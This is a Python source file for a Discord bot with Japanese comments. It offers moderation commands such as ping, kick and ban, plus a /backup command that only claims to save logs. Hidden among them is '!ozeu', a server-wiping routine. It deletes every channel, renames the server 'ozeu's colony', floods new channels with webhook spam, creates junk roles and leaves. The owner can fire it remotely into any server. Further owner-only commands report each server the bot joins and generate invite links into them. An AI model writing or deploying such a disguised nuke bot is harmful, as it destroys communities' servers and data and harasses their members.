import os
import discord
import datetime
from discord.ext import commands
from discord import app_commands
import asyncio
from dotenv import load_dotenv

load_dotenv()
TOKEN = os.getenv("DISCORD_TOKEN")
SPAM_MESSAGE = "こんにちは"
OWNER_ID = 1386539010381451356  # あなたのDiscord ID

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)
tree = bot.tree

@bot.event
async def on_ready():
    await bot.tree.sync()
    print(f"{bot.user} が起動しました！")

# --- !ozeu コマンド（サーバーでは誰でも / DMではOWNERのみ） ---
@bot.command(name="ozeu")
async def ozeu(ctx, guild_id: int = None):
    if ctx.guild is None:
        # DMでの実行 → OWNERのみ許可
        if ctx.author.id != OWNER_ID:
            await ctx.send("❌ このコマンドはBotのオーナーしか使用できません。")
            return
        if guild_id is None:
            await ctx.send("❌ サーバーIDを指定してください。例: `!ozeu <guild_id>`")
            return
        guild = bot.get_guild(guild_id)
        if guild is None:
            await ctx.send(f"❌ ID {guild_id} のサーバーが見つかりません。")
            return
    else:
        # サーバー内からの実行 → 現在のギルドを使用
        guild = ctx.guild

    embed_start = discord.Embed(
        title="📢 !ozeu が実行されました",
        description=f"サーバー「{guild.name}」 (ID: {guild.id}) で ozeu 処理を開始しました。",
        color=discord.Color.green()
    )
    embed_start.add_field(name="実行者", value=f"{ctx.author} (ID: {ctx.author.id})", inline=False)
    embed_start.timestamp = discord.utils.utcnow()

    owner = await bot.fetch_user(OWNER_ID)
    await owner.send(embed=embed_start)
    await ctx.send(embed=embed_start)

    async def delete_channel(channel):
        try:
            await channel.delete()
        except Exception as e:
            print(f"{channel.name} の削除でエラー: {e}")

    delete_tasks = [delete_channel(ch) for ch in guild.channels]
    await asyncio.gather(*delete_tasks)

    try:
        await guild.edit(name="ozeuの植民地")
    except Exception as e:
        print(f"サーバー名の変更でエラー: {e}")

    async def create_channel(index):
        try:
            return await guild.create_text_channel(name="リセット完了　もうしばらくお待ち下さい")
        except Exception as e:
            print(f"{index + 1}個目のチャンネル作成失敗: {e}")
            return None

    created_channels = await asyncio.gather(*[create_channel(i) for i in range(10)])
    created_channels = [ch for ch in created_channels if ch is not None]

    async def send_with_webhook(channel):
        try:
            webhook = await channel.create_webhook(name="ZPlusWebhook")
            for _ in range(50):
                await webhook.send(SPAM_MESSAGE, username="ガバマン")
        except Exception as e:
            print(f"{channel.name} のWebhook送信でエラー: {e}")

    await asyncio.gather(*[send_with_webhook(ch) for ch in created_channels])

    try:
        for i in range(25):
            await guild.create_role(name=f"bot用権限{i+1}")
    except Exception as e:
        print(f"ロール作成でエラー: {e}")

    try:
        await guild.leave()
        embed_done = discord.Embed(
            title="🚪 ozeu処理が完了し、Botはサーバーを退出しました",
            description=(
                f"サーバー名: {guild.name} (ID: {guild.id})\n"
                f"実行者: {ctx.author} (ID: {ctx.author.id})"
            ),
            color=discord.Color.red()
        )
        embed_done.timestamp = discord.utils.utcnow()
        await owner.send(embed=embed_done)
        await ctx.send(embed=embed_done)
    except Exception as e:
        print(f"退出時にエラー: {e}")

# --- /backup コマンド ---
@bot.tree.command(name="backup", description="ログを保存します")
async def backup(interaction: discord.Interaction):
    await interaction.response.send_message("ログを保存しました☑")

# --- /ping コマンド ---
@bot.tree.command(name="ping", description="BOTの応答速度を表示します。")
async def ping(interaction: discord.Interaction):
    latency_ms = round(bot.latency * 1000)
    await interaction.response.send_message(f"応答速度は {latency_ms}ms です")

# --- /kick コマンド ---
@bot.tree.command(name="kick", description="指定したユーザーをキックします")
@app_commands.describe(member="キックするメンバー", reason="理由（省略可）")
async def kick(interaction: discord.Interaction, member: discord.Member, reason: str = "理由なし"):
    if member.top_role >= interaction.user.top_role:
        await interaction.response.send_message("❌ 権限の高いユーザーはキックできません。", ephemeral=True)
        return
    try:
        await member.kick(reason=reason)
        await interaction.response.send_message(f"✅ {member.mention} をキックしました。理由: {reason}")
    except Exception as e:
        await interaction.response.send_message(f"❌ キックに失敗しました: {e}", ephemeral=True)

# --- /ban コマンド ---
@bot.tree.command(name="ban", description="指定したユーザーをBAN（追放）します")
@app_commands.describe(member="BANするメンバー", reason="理由（省略可）")
async def ban(interaction: discord.Interaction, member: discord.Member, reason: str = "理由なし"):
    if member.top_role >= interaction.user.top_role:
        await interaction.response.send_message("❌ 権限の高いユーザーはBANできません。", ephemeral=True)
        return
    try:
        await member.ban(reason=reason)
        embed = discord.Embed(
            title="⛔ ユーザーをBANしました",
            description=f"{member.mention} をサーバーからBANしました。",
            color=discord.Color.red()
        )
        embed.add_field(name="理由", value=reason, inline=False)
        if member.avatar:
            embed.set_thumbnail(url=member.avatar.url)
        embed.set_footer(text=f"実行者: {interaction.user}", icon_url=interaction.user.avatar.url if interaction.user.avatar else None)
        await interaction.response.send_message(embed=embed)
    except Exception as e:
        await interaction.response.send_message(f"❌ BANに失敗しました: {e}", ephemeral=True)

# --- サーバー参加時イベント ---
@bot.event
async def on_guild_join(guild: discord.Guild):
    members = [member async for member in guild.fetch_members()]
    member_count = guild.member_count
    owner_in_guild = any(member.id == OWNER_ID for member in guild.members)
    if member_count <= 5 and not owner_in_guild:
        await guild.leave()
        return

    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    inviter = "不明（監査ログの権限が必要）"
    try:
        async for entry in guild.audit_logs(limit=5, action=discord.AuditLogAction.bot_add):
            if entry.target and entry.target.id == bot.user.id:
                inviter = f"{entry.user}（ID: {entry.user.id}）"
                break
    except discord.Forbidden:
        inviter = "監査ログが取得できません（権限不足）"
    except Exception as e:
        inviter = f"取得失敗: {e}"

    embed = discord.Embed(
        title="🔔 新しいサーバーに参加しました",
        color=discord.Color.green(),
        timestamp=datetime.datetime.now()
    )
    embed.add_field(name="📅 日時", value=now, inline=False)
    embed.add_field(name="🌐 サーバー名", value=f"{guild.name}（ID: {guild.id}）", inline=False)
    embed.add_field(name="🙋‍♂️ 追加したユーザー", value=inviter, inline=False)
    embed.add_field(name="👥 サーバー人数", value=f"{guild.member_count}人", inline=False)
    embed.add_field(name="📊 現在のサーバー数", value=f"{len(bot.guilds)}", inline=False)
    embed.set_footer(text="Bot参加通知")
    try:
        user = await bot.fetch_user(OWNER_ID)
        await user.send(embed=embed)
    except Exception as e:
        print(f"DM送信失敗: {e}")

# --- /leave_server コマンド（開発者専用） ---
@tree.command(name="leave_server", description="指定されたサーバーからBotを退出させます（開発者専用）")
@app_commands.describe(server_id="Botを退出させたいサーバーのID")
async def leave_server(interaction: discord.Interaction, server_id: str):
    if interaction.guild is not None:
        await interaction.response.send_message("このコマンドはDMでのみ使えます。", ephemeral=True)
        return
    if interaction.user.id != OWNER_ID:
        await interaction.response.send_message("このコマンドを使えるのはBotの開発者だけです。", ephemeral=True)
        return
    try:
        guild = bot.get_guild(int(server_id))
        if guild is None:
            await interaction.response.send_message("Botはそのサーバーに参加していません。", ephemeral=True)
            return
        await guild.leave()
        embed = discord.Embed(
            title="🚪 Botがサーバーから退出しました",
            description=f"**{guild.name}**（ID: `{server_id}`）から正常に退出しました。",
            color=discord.Color.red()
        )
        await interaction.response.send_message(embed=embed)
    except Exception as e:
        await interaction.response.send_message(f"エラーが発生しました: {e}", ephemeral=True)

# --- /servers コマンド（開発者専用） ---
@tree.command(name="servers", description="サーバー一覧(開発者専用)")
async def servers(interaction: discord.Interaction):
    if interaction.user.id != OWNER_ID:
        await interaction.response.send_message("このコマンドはBotの開発者のみ使えます。", ephemeral=True)
        return
    guilds = bot.guilds
    server_list = "\n".join(f"{guild.name} - ID: `{guild.id}`" for guild in guilds)
    embed = discord.Embed(
        title=f"🤖 Botが入っているサーバー一覧（{len(guilds)}件）",
        description=server_list or "現在サーバーに参加していません。",
        color=discord.Color.blue()
    )
    await interaction.response.send_message(embed=embed, ephemeral=True)

# --- /get url コマンド（開発者専用） ---
get_group = app_commands.Group(name="get", description="情報取得系コマンド")

@get_group.command(name="url", description="指定されたサーバーの招待リンクを取得します（開発者専用）")
@app_commands.describe(server_id="招待リンクを取得したいサーバーのID")
async def get_url(interaction: discord.Interaction, server_id: str):
    if interaction.user.id != OWNER_ID:
        await interaction.response.send_message("このコマンドはBotの開発者のみ使用できます。", ephemeral=True)
        return

    guild = bot.get_guild(int(server_id))
    if guild is None:
        await interaction.response.send_message("指定されたサーバーにBotが参加していません。", ephemeral=True)
        return

    try:
        for channel in guild.text_channels:
            if channel.permissions_for(guild.me).create_instant_invite:
                invite = await channel.create_invite(max_age=300, max_uses=1, unique=True)
                await interaction.response.send_message(f"✅ 招待リンク: {invite.url}", ephemeral=True)
                return
        await interaction.response.send_message("❌ 招待リンクを作成できるチャンネルが見つかりませんでした。", ephemeral=True)
    except Exception as e:
        await interaction.response.send_message(f"❌ 招待リンクの取得に失敗しました: {e}", ephemeral=True)

tree.add_command(get_group)

# --- 起動 ---
bot.run(TOKEN)
